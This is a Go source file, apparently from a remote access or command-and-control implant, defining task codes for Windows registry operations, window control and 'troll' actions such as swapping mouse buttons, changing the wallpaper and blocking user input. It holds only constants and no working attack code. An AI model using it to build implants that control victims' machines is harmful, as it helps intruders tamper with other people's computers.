//go:build windows || !implant

package task

const (
	regOpLs  uint8 = 0
	regOpGet uint8 = iota
	regOpMake
	regOpDeleteKey
	regOpDelete
	regOpSet
	regOpSetString
	regOpSetDword
	regOpSetQword
	regOpSetBytes
	regOpSetExpandString
	regOpSetStringList
)
const (
	taskWindowEnable  uint8 = 0
	taskWindowDisable uint8 = iota
	taskWindowTransparency
)
const (
	taskTrollSwapEnable  uint8 = 0
	taskTrollSwapDisable uint8 = iota
	taskTrollHcEnable
	taskTrollHcDisable
	taskTrollWallpaper
	taskTrollWallpaperPath
	taskTrollBlockInputEnable
	taskTrollBlockInputDisable
)
